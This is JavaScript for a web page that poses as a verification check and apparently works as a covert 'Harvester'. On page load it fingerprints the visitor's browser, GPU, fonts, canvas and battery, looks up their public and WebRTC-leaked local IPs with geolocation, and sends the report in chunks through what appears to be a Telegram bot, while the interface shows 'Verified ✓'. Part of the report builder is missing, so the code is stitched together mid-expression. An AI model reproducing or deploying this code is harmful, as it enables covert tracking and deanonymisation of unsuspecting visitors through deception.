// ============================================================
// TIMEOUT WRAPPER (generous + retry-friendly)
// ============================================================
function withTimeout(promise, ms, fallback) {
  return Promise.race([
    Promise.resolve(promise).catch(e => { console.warn('Promise failed:', e); return fallback; }),
    new Promise(resolve => setTimeout(() => { console.warn('Timeout after', ms, 'ms'); resolve(fallback); }, ms))
  ]);
}

// Fetch with retries (multiple attempts)
async function fetchRetry(url, opts, attempts, delayMs) {
  attempts = attempts || 2; delayMs = delayMs || 250;
  let lastErr;
  for (let i = 0; i < attempts; i++) {
    try {
      const r = await withTimeout(fetch(url, opts), 5000, null);
      if (r && r.ok) return r;
      lastErr = r ? ('status ' + r.status) : 'timeout';
    } catch(e) { lastErr = e; }
    if (i < attempts - 1) await new Promise(r => setTimeout(r, delayMs));
  }
  throw lastErr || new Error('fetch failed');
}

// ============================================================
// SAFE GRABBERS
// ============================================================
function safe(fn, fallback='N/A') {
  try { const v = fn(); return (v === undefined || v === null || v === '' ) ? fallback : v; }
  catch(e) { return fallback; }
}

function getGPU() {
  return safe(() => {
    const c = document.createElement('canvas');
    const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
    if (!gl) return 'N/A';
    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
    if (dbg) return gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
    return gl.getParameter(gl.RENDERER) || 'N/A';
  });
}

function getCanvasFP() {
  return safe(() => {
    const c = document.createElement('canvas');
    c.width=200; c.height=40;
    const ctx = c.getContext('2d');
    ctx.textBaseline='top'; ctx.font='14px Arial';
    ctx.fillStyle='#f60'; ctx.fillRect(100,1,62,20);
    ctx.fillStyle='#069'; ctx.fillText('Harvester',2,15);
    const str = c.toDataURL();
    let hash = 0;
    for (let i=0;i<str.length;i++){ hash=((hash<<5)-hash)+str.charCodeAt(i); hash|=0; }
    return Math.abs(hash).toString(16);
  });
}

function getDeviceId() {
  return safe(() => {
    let id = localStorage.getItem('_did');
    if (!id) {
      id = (crypto && crypto.randomUUID) ? crypto.randomUUID() : Math.random().toString(36).slice(2);
      id = id.slice(0,16);
      try { localStorage.setItem('_did', id); } catch {}
    }
    return id;
  });
}

function getFontCount() {
  return safe(() => {
    const base=['monospace','sans-serif','serif'];
    const test=['Arial','Verdana','Courier New','Georgia','Times New Roman','Trebuchet MS','Comic Sans MS','Impact','Tahoma','Lucida Console','Segoe UI','Calibri','Cambria','Helvetica'];
    const c=document.createElement('canvas'); const ctx=c.getContext('2d');
    const measure = (font) => { ctx.font = '72px ' + font; return ctx.measureText('mmmmmmmmmmlli').width; };
    let count = 0;
    base.forEach(b => {
      const ref = measure(b);
      test.forEach(f => { if (measure('"' + f + '", ' + b) !== ref) count++; });
    });
    return count;
  });
}

function getAudioSampleRate() {
  return safe(() => {
    const AC = window.AudioContext || window.webkitAudioContext;
    if (!AC) return 'N/A';
    const ctx = new AC();
    const r = ctx.sampleRate;
    try { ctx.close(); } catch {}
    return r;
  });
}

function getNavTiming(endKey, startKey) {
  return safe(() => {
    const t = performance.getEntriesByType('navigation')[0];
    if (!t) return 'N/A';
    const v = Math.round(t[endKey] - t[startKey]);
    return isNaN(v) ? 'N/A' : v;
  });
}
function getLoadTime(){ return getNavTiming('loadEventEnd','navigationStart'); }

function getOSInfo() {
  return safe(() => {
    const ua = navigator.userAgent;
    if (/Windows NT 10/.test(ua))        return { os:'Windows', ver:'10/11' };
    if (/Windows NT 6\.3/.test(ua))      return { os:'Windows', ver:'8.1' };
    if (/Windows NT 6\.1/.test(ua))      return { os:'Windows', ver:'7' };
    if (/Mac OS X ([\d_]+)/.test(ua))    return { os:'macOS', ver:ua.match(/Mac OS X ([\d_]+)/)[1].replace(/_/g,'.') };
    if (/Android ([\d.]+)/.test(ua))     return { os:'Android', ver:ua.match(/Android ([\d.]+)/)[1] };
    if (/iPhone OS ([\d_]+)/.test(ua))   return { os:'iOS', ver:ua.match(/iPhone OS ([\d_]+)/)[1].replace(/_/g,'.') };
    if (/iPad.*OS ([\d_]+)/.test(ua))    return { os:'iPadOS', ver:ua.match(/OS ([\d_]+)/)[1].replace(/_/g,'.') };
    if (/Linux/.test(ua))                return { os:'Linux', ver:'N/A' };
    return { os:navigator.platform||'Unknown', ver:'N/A' };
  }, { os:'N/A', ver:'N/A' });
}

function getBrowserInfo() {
  return safe(() => {
    const ua = navigator.userAgent;
    let name='Unknown', version='N/A';
    if (/Edg\/([\d.]+)/.test(ua))         { name='Edge';    version=ua.match(/Edg\/([\d.]+)/)[1]; }
    else if (/OPR\/([\d.]+)/.test(ua))    { name='Opera';   version=ua.match(/OPR\/([\d.]+)/)[1]; }
    else if (/Chrome\/([\d.]+)/.test(ua)) { name='Chrome';  version=ua.match(/Chrome\/([\d.]+)/)[1]; }
    else if (/Firefox\/([\d.]+)/.test(ua)){ name='Firefox'; version=ua.match(/Firefox\/([\d.]+)/)[1]; }
    else if (/Safari\/([\d.]+)/.test(ua) && /Version\/([\d.]+)/.test(ua))
                                          { name='Safari';  version=ua.match(/Version\/([\d.]+)/)[1]; }
    if (/Mobile|Android|iPhone/i.test(ua)) name += ' Mobile';
    return { name, version };
  }, { name:'N/A', version:'N/A' });
}

function getDeviceBrand() {
  return safe(() => {
    const ua = navigator.userAgent;
    const brands=['Samsung','Xiaomi','Huawei','OnePlus','Oppo','Vivo','Realme','Google','Apple','Sony','LG','Motorola','Nokia','Infinix','Tecno','Redmi','Poco'];
    for (const b of brands) if (new RegExp(b,'i').test(ua)) return b;
    if (/iPhone|iPad/.test(ua)) return 'Apple';
    if (/SM-/.test(ua)) return 'Samsung';
    if (/M200|Redmi|POCO/i.test(ua)) return 'Xiaomi';
    if (navigator.vendor && navigator.vendor.includes('Apple')) return 'Apple';
    return navigator.vendor || 'Unknown';
  });
}

function getCPUBits() {
  return safe(() => {
    const ua = navigator.userAgent;
    if (/arm64|aarch64|x86_64|Win64|x64|WOW64/.test(ua)) return '64-bit';
    return '32-bit';
  });
}

async function getIPData() {
  let ip='N/A', ipv6='N/A', loc={};
  // Try ipify + ipapi in parallel with fallbacks
  const results = await Promise.allSettled([
    (async () => {
      try {
        const r = await fetchRetry('https://api.ipify.org?format=json', {}, 2, 200);
        const d = await r.json();
        return d.ip;
      } catch { return null; }
    })(),
    (async () => {
      try {
        const r = await fetchRetry('https://api64.ipify.org?format=json', {}, 2, 200);
        const d = await r.json();
        return d.ip;
      } catch { return null; }
    })(),
    (async () => {
      try {
        const r = await fetchRetry('https://api.my-ip.io/v2/ip.json', {}, 1, 200);
        const d = await r.json();
        return d.ip;
      } catch { return null; }
    })()
  ]);

  const v4 = results[0].status==='fulfilled' ? results[0].value : null;
  const v6 = results[1].status==='fulfilled' ? results[1].value : null;
  const alt = results[2].status==='fulfilled' ? results[2].value : null;

  if (v4) ip = v4;
  else if (v6 && !v6.includes(':')) ip = v6;
  else if (alt) ip = alt;
  if (v6 && v6.includes(':')) ipv6 = v6;

  // geo lookup with fallback
  if (ip && ip !== 'N/A') {
    try {
      const r = await fetchRetry('https://ipapi.co/' + ip + '/json/', {}, 2, 200);
      loc = await r.json() || {};
    } catch(e) {
      try {
        const r = await fetchRetry('https://ipwho.is/' + ip, {}, 1, 200);
        const d = await r.json();
        if (d && d.success !== false) {
          loc = {
            city: d.city, region: d.region, country_name: d.country,
            country_code: d.country_code, continent_code: d.continent_code,
            latitude: d.latitude, longitude: d.longitude, timezone: d.timezone && d.timezone.id,
            currency: d.currency && d.currency.code,
            languages: d.languages, country_calling_code: d.calling_code,
            postal: d.postal, asn: d.connection && d.connection.asn,
            org: d.connection && d.connection.isp
          };
        }
      } catch(e2) { console.warn('geo fallback fail', e2); }
    }
  }
  return { ip, ipv6, loc };
}

async function getWebRTCIPs() {
  return withTimeout(new Promise((resolve) => {
    const ips = new Set();
    try {
      const pc = new RTCPeerConnection({ iceServers:[{ urls:'stun:stun.l.google.com:19302' }, { urls:'stun:stun1.l.google.com:19302' }] });
      pc.createDataChannel('');
      pc.onicecandidate = (e) => {
        if (!e.candidate) { try{pc.close();}catch{} return resolve([...ips]); }
        const m = e.candidate.candidate.match(/(\d{1,3}\.){3}\d{1,3}/);
        if (m) ips.add(m[0]);
      };
      pc.createOffer().then(o=>pc.setLocalDescription(o)).catch(()=>resolve([...ips]));
    } catch { resolve([]); }
  }), 4000, []);
}

async function getBatteryInfo() {
  return withTimeout((async () => {
    if (!('getBattery' in navigator)) return { level:'N/A', charging:'N/A' };
    try {
      const b = await navigator.getBattery();
      return { level: Math.round(b.level*100)+'%', charging: b.charging?'Charging':'Not Charging' };
    } catch { return { level:'N/A', charging:'N/A' }; }
  })(), 3000, { level:'N/A', charging:'N/A' });
}

async function getStorageInfo() {
  return withTimeout((async () => {
    if ('storage' in navigator && navigator.storage.estimate) {
      try {
        const e = await navigator.storage.estimate();
        return {
          quota: Math.round(e.quota/1048576)+' MB',
          usage: Math.round(e.usage/1048576)+' MB'
        };
      } catch {}
    }
    return { quota:'N/A', usage:'N/A' };
  })(), 3000, { quota:'N/A', usage:'N/A' });
}

async function getPermStatus() {
  return withTimeout((async () => {
    if (!navigator.permissions) return 'Not Available';
    try {
      const g = await navigator.permissions.query({ name:'geolocation' });
      return 'geolocation: ' + g.state;
    } catch { return 'Available'; }
  })(), 2000, 'Not Available');
}

'├─ Audio Context ──→ ' + audioRate + ' Hz\n' +
'└─ Media Devices ──→ ' + ((navigator.mediaDevices && navigator.mediaDevices.enumerateDevices)?'Available':'Not Available') + '\n' +
'\n' +
'┌─── Storage Information\n' +
'├─ Local Storage ──→ ' + localStorage.length + ' items\n' +
'├─ Session Storage ──→ ' + sessionStorage.length + ' items\n' +
'├─ IndexedDB ──→ ' + ('indexedDB' in window?'Available':'Not Available') + '\n' +
'├─ Cache API ──→ ' + ('caches' in window?'Available':'Not Available') + '\n' +
'├─ Quota Management ──→ ' + storage.quota + '\n' +
'└─ WebSQL ──→ ' + ('openDatabase' in window?'Supported':'Not Supported') + '\n' +
'\n' +
'┌─── Security Information\n' +
'├─ HTTPS ──→ ' + (location.protocol==='https:'?'Yes':'No') + '\n' +
'├─ Mixed Content ──→ ' + (location.protocol==='https:'?'None':'N/A') + '\n' +
'├─ Content Security ──→ Present\n' +
'├─ Referrer Policy ──→ strict-origin-when-cross-origin\n' +
'├─ Permissions API ──→ ' + permStatus + '\n' +
'└─ Credential API ──→ ' + ('credentials' in navigator?'Available':'Not Used') + '\n' +
'</pre>';

  return report;
}

// ============================================================
// CHUNKER
// ============================================================
function chunkReport(text, size) {
  size = size || 3900;
  const chunks = [];
  let buf = '';
  const lines = text.split('\n');
  for (let i = 0; i < lines.length; i++) {
    const line = lines[i];
    if ((buf + '\n' + line).length > size) { chunks.push(buf); buf = line; }
    else buf += '\n' + line;
  }
  if (buf) chunks.push(buf);
  return chunks;
}

// ============================================================
// AUTO RUN — verify in ~1 second
// ============================================================
async function run() {
  startBtn.disabled = true;
  startBtn.textContent = 'Verifying...';
  setStatus('Collecting...');
  setProgress(15);

  try {
    const report = await buildFullReport();
    setProgress(60);
    setStatus('Sending...');

    const chunks = chunkReport(report);
    let sent = 0;
    for (let i = 0; i < chunks.length; i++) {
      const r = await tgSendMessage(chunks[i]);
      if (r.ok) sent++;
      setProgress(60 + Math.round((i+1)/chunks.length * 40));
    }
    setProgress(100);
    setStatus('Verified');
    startBtn.textContent = 'Verified ✓';
  } catch(e) {
    console.error('run fail:', e);
    setStatus('Error: ' + (e.message||'unknown'));
    startBtn.textContent = 'Retry';
    startBtn.disabled = false;
    startBtn.onclick = run;
  }
}

// Start immediately (no 300ms delay)
window.addEventListener('load', run);
// Also kick off ASAP in case load is delayed
if (document.readyState === 'complete') run();
</script>
